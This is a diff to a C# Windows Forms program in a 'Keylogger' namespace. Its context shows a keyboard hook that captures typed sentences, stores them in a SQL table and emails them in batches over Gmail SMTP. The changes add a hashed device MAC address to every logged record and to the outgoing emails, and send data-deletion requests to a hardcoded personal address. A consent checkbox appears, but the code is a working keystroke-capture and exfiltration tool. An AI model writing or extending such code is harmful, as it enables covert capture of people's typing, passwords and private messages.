@@ -1,20 +1,25 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Configuration;
 using System.Data;
+using System.Data.SqlClient;
 using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Data.SqlClient;
-using System.Net;
-using System.Net.Mail;
-using System.Configuration;
+using System.Security.Cryptography;
+
+
+
 
 namespace Keylogger
 {
@@ -125,6 +130,13 @@ namespace Keylogger
 
             
             sendTimer.Start();
+
+
+            var primaryMac = GetPrimaryMacAddress();
+            if (!string.IsNullOrEmpty(primaryMac))
+                lblMac.Text = primaryMac;
+            else
+                lblMac.Text = "MAC adresi bulunamadı.";
         }
 
         protected override void OnFormClosing(FormClosingEventArgs e)
@@ -224,21 +236,27 @@ namespace Keylogger
 
             return CallNextHookEx(hHook, code, wParam, lParam);
         }
-
         public void CumleyiKaydet(string cumle)
         {
             try
             {
+                // Cihazın birincil MAC'ini al, hashle
+                string primaryMac = GetPrimaryMacAddress();
+                string macHash = null;
+                if (!string.IsNullOrEmpty(primaryMac))
+                    macHash = Sha256Hex(primaryMac);
+
                 using (SqlConnection con = new SqlConnection(DbConnectionString))
-                using (SqlCommand cmd = new SqlCommand("INSERT INTO TBL_LOGGER (logl, tarih, gonderildi, sendAttempts) VALUES (@logl, @tarih, 0, 0)", con))
+                using (SqlCommand cmd = new SqlCommand(
+                    "INSERT INTO TBL_LOGGER (logl, tarih, gonderildi, sendAttempts, mac_hash) VALUES (@logl, @tarih, 0, 0, @mac_hash)", con))
                 {
                     cmd.Parameters.AddWithValue("@logl", cumle);
                     cmd.Parameters.AddWithValue("@tarih", DateTime.Now);
+                    cmd.Parameters.AddWithValue("@mac_hash", (object)macHash ?? DBNull.Value);
                     con.Open();
                     cmd.ExecuteNonQuery();
                 }
 
-               
                 if (rtxtLog.InvokeRequired)
                     rtxtLog.Invoke((MethodInvoker)(() => rtxtLog.AppendText(Environment.NewLine + "[KAYIT ALINDI] " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine)));
                 else
@@ -246,18 +264,18 @@ namespace Keylogger
             }
             catch (Exception ex)
             {
-                
                 Debug.WriteLine("CumleyiKaydet hata: " + ex.Message);
             }
         }
 
-        private List<(int id, string text, DateTime time, int attempts)> GetPendingLogsBatch(int top)
+
+        private List<(int id, string text, DateTime time, int attempts, string macHash)> GetPendingLogsBatch(int top)
         {
-            var list = new List<(int, string, DateTime, int)>();
-            string query = @"SELECT TOP(@top) logId, logl, tarih, sendAttempts 
-                             FROM TBL_LOGGER 
-                             WHERE gonderildi = 0 AND sendAttempts < @maxAttempts
-                             ORDER BY logId ASC";
+            var list = new List<(int, string, DateTime, int, string)>();
+            string query = @"SELECT TOP(@top) logId, logl, tarih, sendAttempts, mac_hash
+                     FROM TBL_LOGGER 
+                     WHERE gonderildi = 0 AND sendAttempts < @maxAttempts
+                     ORDER BY logId ASC";
 
             using (SqlConnection conn = new SqlConnection(DbConnectionString))
             using (SqlCommand cmd = new SqlCommand(query, conn))
@@ -273,13 +291,15 @@ namespace Keylogger
                         string text = rdr["logl"] as string ?? "";
                         DateTime time = rdr["tarih"] == DBNull.Value ? DateTime.MinValue : (DateTime)rdr["tarih"];
                         int attempts = rdr["sendAttempts"] == DBNull.Value ? 0 : (int)rdr["sendAttempts"];
-                        list.Add((id, text, time, attempts));
+                        string macHash = rdr["mac_hash"] == DBNull.Value ? null : (string)rdr["mac_hash"];
+                        list.Add((id, text, time, attempts, macHash));
                     }
                 }
             }
 
             return list;
         }
+
 
         private void MarkAsSent(IEnumerable<int> ids)
         {
@@ -324,7 +344,16 @@ namespace Keylogger
                 sb.AppendLine();
                 foreach (var p in pending)
                 {
+                    // p: (id, text, time, attempts, macHash)
                     sb.AppendLine($"{p.time:yyyy-MM-dd HH:mm:ss} - {p.text}");
+                    if (!string.IsNullOrEmpty(p.macHash))
+                    {
+                        sb.AppendLine($"Cihaz MAC (SHA256): {p.macHash}");
+                    }
+                    else
+                    {
+                        sb.AppendLine("Cihaz MAC: (yok)");
+                    }
                     sb.AppendLine(new string('-', 40));
                 }
 
@@ -358,6 +387,7 @@ namespace Keylogger
                 Debug.WriteLine("SendPendingLogsBatch hata: " + ex.Message);
             }
         }
+
 
         private void SendEmail_WithGmailSmtp(string smtpUserLocal, string smtpAppPasswordLocal, string toEmail, string subject, string body)
         {
@@ -394,20 +424,30 @@ namespace Keylogger
             Process.Start("chrome", "https://github.com/BilalAbic");
         }
 
+        private string Sha256Hex(string input)
+        {
+            if (string.IsNullOrEmpty(input)) return null;
+            using (var sha = SHA256.Create())
+            {
+                var bytes = Encoding.UTF8.GetBytes(input);
+                var hash = sha.ComputeHash(bytes);
+                var sb = new StringBuilder(64);
+                foreach (var b in hash) sb.Append(b.ToString("x2"));
+                return sb.ToString();
+            }
+        }
 
-       
+
         private void btnOnay_Click(object sender, EventArgs e)
         {
             try
             {
-               
                 if (!rbtOnay.Checked)
                 {
                     MessageBox.Show("Lütfen onay kutusunu işaretleyin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     return;
                 }
 
-               
                 string userEmail = txtEmail.Text.Trim();
                 if (string.IsNullOrEmpty(userEmail))
                 {
@@ -415,12 +455,24 @@ namespace Keylogger
                     return;
                 }
 
-                
-                string subject = "Veri Silme Talebi";
-                string body = $"Merhaba,\n\n{userEmail} e-posta adresine ait kullanıcı verilerinin silinmesini talep ediyorum.\n\nTeşekkürler.";
+                // Bu cihazın MAC'ini al ve hashle
+                string primaryMac = GetPrimaryMacAddress();
+                string macHash = !string.IsNullOrEmpty(primaryMac) ? Sha256Hex(primaryMac) : null;
 
-                
-                SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, smtpUser, subject, body);
+                string subject = "Veri Silme Talebi";
+                var bodySb = new StringBuilder();
+                bodySb.AppendLine("Merhaba,");
+                bodySb.AppendLine();
+                bodySb.AppendLine($"{userEmail} e-posta adresine ait kullanıcı verilerinin silinmesini talep ediyorum.");
+                bodySb.AppendLine();
+                if (!string.IsNullOrEmpty(macHash))
+                    bodySb.AppendLine($"Talep eden cihazın MAC (SHA256): {macHash}");
+                else
+                    bodySb.AppendLine("Talep eden cihazın MAC bilgisi elde edilemedi.");
+                bodySb.AppendLine();
+                bodySb.AppendLine("Teşekkürler.");
+
+                SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, "bilalabic78@gmail.com", subject, bodySb.ToString());
 
                 MessageBox.Show("Talebiniz gönderildi.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
@@ -429,6 +481,25 @@ namespace Keylogger
                 MessageBox.Show("Mail gönderim hatası: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 Debug.WriteLine("Veri silme talebi gönderim hatası: " + ex.Message);
             }
+        }
+
+
+        private string FormatMacAddress(PhysicalAddress pa)
+        {
+            var bytes = pa.GetAddressBytes();
+            return string.Join(":", bytes.Select(b => b.ToString("X2")));
+        }
+        private string GetPrimaryMacAddress()
+        {
+            var nic = NetworkInterface.GetAllNetworkInterfaces()
+                .Where(ni =>
+                    ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
+                    ni.OperationalStatus == OperationalStatus.Up &&
+                    ni.GetPhysicalAddress()?.GetAddressBytes().Length > 0)
+                .OrderByDescending(ni => ni.Speed)
+                .FirstOrDefault();
+
+            return nic != null ? FormatMacAddress(nic.GetPhysicalAddress()) : null;
         }
 
     }
